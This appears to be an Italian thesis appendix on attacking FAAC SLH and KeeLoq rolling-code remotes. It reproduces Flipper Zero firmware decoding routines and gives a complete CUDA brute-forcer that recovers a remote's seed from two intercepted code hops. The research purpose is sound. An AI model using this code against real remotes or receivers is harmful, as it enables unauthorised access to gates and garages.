\titleformat{\chapter} {\normalfont\Large\bfseries}{Appendice \thechapter}{1em}{}
\appendix

\chapter{Decodifica seed FAAC SLH}
\label{appendix:slhseed}

Di seguito è mostrato il codice che viene eseguito nel Flipper Zero (firmware Unleashed) \cite{firmware} e, ipoteticamente, nel ricevitore FAAC XR2 per la decodifica del seed da una chiave di programmazione.
\begin{lstlisting}[language=C,basicstyle=\small]
if(((data_prg[7] == 0x52) && (data_prg[6] == 0x0F) && (data_prg[0] == 0x00))) {
    faac_prog_mode = true;
    // ProgMode ON
    for(uint8_t i = data_prg[1] & 0xF; i != 0; i--) {
        data_tmp = data_prg[2];

        data_prg[2] = data_prg[2] >> 1 | (data_prg[3] & 1) << 7;
        data_prg[3] = data_prg[3] >> 1 | (data_prg[4] & 1) << 7;
        data_prg[4] = data_prg[4] >> 1 | (data_prg[5] & 1) << 7;
        data_prg[5] = data_prg[5] >> 1 | (data_tmp & 1) << 7;
    }
    data_prg[2] ^= data_prg[1];
    data_prg[3] ^= data_prg[1];
    data_prg[4] ^= data_prg[1];
    data_prg[5] ^= data_prg[1];

    instance->seed = data_prg[5] << 24 | data_prg[4] << 16 | data_prg[3] << 8 |
    data_prg[2];

    uint32_t dec_prg_1 = data_prg[7] << 24 | data_prg[6] << 16 | data_prg[5] << 8 |
                          data_prg[4];
    uint32_t dec_prg_2 = data_prg[3] << 24 | data_prg[2] << 16 | data_prg[1] << 8 |
                          data_prg[0];
    instance->data_2 = (uint64_t)dec_prg_1 << 32 | dec_prg_2;
    instance->cnt = data_prg[1];

    *manufacture_name = "FAAC_SLH";
    return;
\end{lstlisting}

\chapter{Funzioni di decodifica di una chiave normale in KeeLoq}
\label{appendix:keeloq_functions}

Di seguito sono riportate le varie implementazioni degli algoritmi di FAAC SLH e KeeLoq nel firmware Unleashed \cite{firmware} del Flipper Zero.\\
La seguente funzione restituisce la chiave a 64 bit necessaria in KeeLoq a partire dal seed e dalla manufacturer key. Questa funzione si trova nel file \texttt{lib/subghz/protocols/keeloq\_common.c}.
\begin{lstlisting}[language=C,basicstyle=\small]
inline uint64_t subghz_protocol_keeloq_common_faac_learning
    (const uint32_t seed, const uint64_t key) {
    uint16_t hs = seed >> 16;
    const uint16_t ending = 0x544D;
    uint32_t lsb = (uint32_t)hs << 16 | ending;
    uint64_t man =
        (uint64_t)subghz_protocol_keeloq_common_encrypt(seed, key) << 32 |
        subghz_protocol_keeloq_common_encrypt(lsb, key);
    return man;
}
\end{lstlisting}

La seguente funzione è l'implementazione della fase di crittografia di KeeLoq. Questa funzione si trova nel file \texttt{lib/subghz/protocols/keeloq\_common.c}.
\begin{lstlisting}[language=C,basicstyle=\small]
inline uint32_t subghz_protocol_keeloq_common_encrypt
    (const uint32_t data, const uint64_t key) {
    uint32_t x = data, r;
    for(r = 0; r < 528; r++)
        x = (x >> 1) ^ ((bit(x, 0) ^ bit(x, 16) ^ (uint32_t)bit(key, r & 63) ^
                         bit(KEELOQ_NLF, g5(x, 1, 9, 20, 26, 31))) << 31);
    return x;
}
\end{lstlisting}

La seguente funzione è l'implementazione della fase di decrittografia di KeeLoq. Questa funzione si trova nel file \texttt{lib/subghz/protocols/keeloq\_common.c}.
\begin{lstlisting}[language=C,basicstyle=\small]
inline uint32_t subghz_protocol_keeloq_common_decrypt
    (const uint32_t data, const uint64_t key) {
    uint32_t x = data, r;
    for(r = 0; r < 528; r++)
        x = (x << 1) ^ bit(x, 31) ^ bit(x, 15) ^
            (uint32_t)bit(key, (15 - r) & 63) ^
            bit(KEELOQ_NLF, g5(x, 0, 8, 19, 25, 30));
    return x;
}
\end{lstlisting}

Il seguente segmento di codice estrae il valore del counter a partire dal code hop sfruttando le funzioni sopra riportate. Questa funzione si trova nel file \texttt{lib/subghz/protocols/faac\_slh.c}.
\begin{lstlisting}[language=C,basicstyle=\small]
for
  M_EACH(manufacture_code, *subghz_keystore_get_data(keystore), SubGhzKeyArray_t) {
      switch(manufacture_code->type) {
      case KEELOQ_LEARNING_FAAC:
          // FAAC Learning
          man = subghz_protocol_keeloq_common_faac_learning(
              instance->seed, manufacture_code->key);
          decrypt = subghz_protocol_keeloq_common_decrypt(code_hop, man);
          *manufacture_name = furi_string_get_cstr(manufacture_code->name);
          break;
      }
  }
instance->cnt = decrypt & 0xFFFFF;
\end{lstlisting}

\chapter{Brute-forcer del seed di FAAC SLH in CUDA}
\label{appendix:cuda}

Di seguito è riportato il codice in CUDA dell'algoritmo di brute forcing del seed di FAAC SLH. Tale algoritmo assume che due chiavi normali in sequnza siano state catturate e prende in input i due code hop e il serial intercettati.
\begin{lstlisting}[language=C++,basicstyle=\small,showstringspaces=false]
#include <cstdlib>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <cuda_runtime.h>

#define MFKEY 0xFFFFFFFFFFFFFFFF
#define KEELOQ_NLF 0x3A5C742E
#define bit(x, n) (((x) >> (n)) & 1)
#define g5(x, a, b, c, d, e) (bit(x, a) + bit(x, b) * 2 + \\
          bit(x, c) * 4 + bit(x, d) * 8 + bit(x, e) * 16)

__device__ uint32_t keeloq_encrypt_device(uint32_t data, uint64_t key) {
    uint32_t x = data;
    for (int r = 0; r < 528; r++) {
        x = (x >> 1) ^ ((bit(x, 0) ^ bit(x, 16) ^ (uint32_t)bit(key, r & 63) ^
                         bit(KEELOQ_NLF, g5(x, 1, 9, 20, 26, 31))) << 31);
    }
    return x;
}

__device__ uint64_t faac_learning_device(uint32_t seed, uint64_t key) {
    uint16_t hs = seed >> 16;
    const uint16_t ending = 0x544D;
    uint32_t lsb = (uint32_t)hs << 16 | ending;
    uint64_t man = (uint64_t)keeloq_encrypt_device(seed, key) << 32 |
                             keeloq_encrypt_device(lsb, key);
    return man;
}

struct Result {
    bool found;
    uint32_t seed;
    uint32_t count;
};

__global__ void find_sequence_chunk_kernel(
    uint32_t first_hop,
    uint32_t second_hop,
    uint64_t mfkey,
    uint32_t fix,
    uint32_t start_seed,
    uint32_t end_seed,
    Result *result) {
    uint32_t seed = blockIdx.x * blockDim.x + threadIdx.x + start_seed;
    if (seed > end_seed || result->found) return;

    uint64_t man = faac_learning_device(seed, mfkey);
    uint8_t fixx[8];
    int shiftby = 32;
    for (int i = 0; i < 8; i++) {
        fixx[i] = (fix >> (shiftby -= 4)) & 0xF;
    }

    uint32_t prev_hop = keeloq_encrypt_device(fixx[6] << 28 |
                        fixx[7] << 24 | fixx[5] << 20 | 0xFFFFF, mfkey);

    for (uint32_t count = 0x1; count <= 0xFFFFF && !result->found; ++count) {
        uint32_t decrypt;
        if ((count % 2) == 0) {
            decrypt = fixx[6] << 28 | fixx[7] << 24 |
                      fixx[5] << 20 | (count & 0xFFFFF);
        } else {
            decrypt = fixx[2] << 28 | fixx[3] << 24 |
                      fixx[4] << 20 | (count & 0xFFFFF);
        }

        uint32_t hop = keeloq_encrypt_device(decrypt, man);

        if (prev_hop == first_hop && hop == second_hop) {
            result->found = true;
            result->seed = seed;
            result->count = count;
            break;
        }
        prev_hop = hop;

        if (count == 0x1)
            printf("Thread %d, Seed: %08X, Count: %05X, Decrypt: %08X,
            Hop: %08X\n", threadIdx.x + blockIdx.x * blockDim.x,
            seed, count, decrypt, hop);
    }
}

int main(void) {
    uint32_t first_hop, second_hop, fix;
    char hex_input[10];
    char *endptr1, *endptr2, *endptr3;

    printf("Enter first hop (without 0x): ");
    while (fgets(hex_input, sizeof(hex_input), stdin) == NULL) {
        perror("Error reading input, try again");
    }
    size_t len = strlen(hex_input);
    if (len > 0 && hex_input[len - 1] == '\n') {
        hex_input[len - 1] = '\0';
    }
    first_hop = strtoul(hex_input, &endptr1, 16);

    printf("Enter second hop (without 0x): ");
    while (fgets(hex_input, sizeof(hex_input), stdin) == NULL) {
        perror("Error reading input, retry");
    }
    len = strlen(hex_input);
    if (len > 0 && hex_input[len - 1] == '\n') {
        hex_input[len - 1] = '\0';
    }
    second_hop = strtoul(hex_input, &endptr2, 16);

    printf("Enter fix (without 0x): ");
    while(fgets(hex_input, sizeof(hex_input), stdin) == NULL) {
        perror("Error reading input, retry");
    }
    len = strlen(hex_input);
    if(len > 0 && hex_input[len - 1] == '\n') {
        hex_input[len - 1] = '\0';
    }
    fix = strtoul(hex_input, &endptr3, 16);

    if (*endptr1 != '\0' || *endptr2 != '\0' || *endptr3 != '\0') {
        fprintf(stderr, "Error: invalid hexadecimal characters found\n");
        return 1;
    }

    printf("\nFirst hop: %08X\nSecond hop: %08X\nFix: %08X\n\nContinue? (y/N) ",
            first_hop, second_hop, fix);
    char input[10];
    while (fgets(input, sizeof(input), stdin) == NULL) {
        perror("Bruh");
    }
    len = strlen(input);
    if (len > 0 && input[len - 1] == '\n') {
        input[len - 1] = '\0';
    }
    if (strcmp(input, "y") != 0) {
        printf("Aborting.\n");
        return 1;
    }
    printf("Continuing execution on GPU with chunked seed processing...\n");

    Result host_result;
    host_result.found = false;
    host_result.seed = 0;
    host_result.count = 0;

    Result *device_result;
    cudaError_t cuda_err;
    cuda_err = cudaMalloc((void **)&device_result, sizeof(Result));
    if (cuda_err != cudaSuccess) {
        fprintf(stderr, "CUDA malloc failed: %s\n",
                cudaGetErrorString(cuda_err));
        return 1;
    }
    cuda_err = cudaMemcpy(device_result, &host_result,
                          sizeof(Result), cudaMemcpyHostToDevice);
    if (cuda_err != cudaSuccess) {
        fprintf(stderr, "CUDA memcpy HtoD (initial result) failed: %s\n",
                cudaGetErrorString(cuda_err));
        cudaFree(device_result);
        return 1;
    }

    uint32_t start_seed = 0x0;
    uint32_t chunk_size = 0x100000;
    int threadsPerBlock = 1024;

    while (start_seed <= 0xFFFFFFFF && !host_result.found) {
        uint32_t end_seed = start_seed + chunk_size - 1;
        if (end_seed > 0xFFFFFFFF) {
            end_seed = 0xFFFFFFFF;
        }

        int numBlocks = (chunk_size + threadsPerBlock - 1) / threadsPerBlock;

        find_sequence_chunk_kernel<<<numBlocks, threadsPerBlock>>>(
          first_hop,
          second_hop,
          MFKEY,
          fix,
          start_seed,
          end_seed,
          device_result);

        cudaDeviceSynchronize();
        cuda_err = cudaGetLastError();
        if (cuda_err != cudaSuccess) {
            fprintf(stderr, "CUDA kernel launch failed for seed range \\
            [%08X - %08X]: %s\n",
            start_seed, end_seed,
            cudaGetErrorString(cuda_err));
            cudaFree(device_result);
            return 1;
        }

        cuda_err = cudaMemcpy(
          &host_result,
          device_result,
          sizeof(Result),
          cudaMemcpyDeviceToHost);
        if (cuda_err != cudaSuccess) {
            fprintf(stderr, "CUDA memcpy DtoH (result update) \\
            failed: %s\n", cudaGetErrorString(cuda_err));
            cudaFree(device_result);
            return 1;
        }

        if (host_result.found) {
            break;
        }

        start_seed += chunk_size;
    }

    cudaFree(device_result);

    if (host_result.found) {
        printf("FOUND:\nSeed: %08X\tCount: %05X\n",
        host_result.seed,
        host_result.count);
    } else {
        printf("Sequence not found after checking all seed ranges.\n");
    }

    return 0;
}
\end{lstlisting}
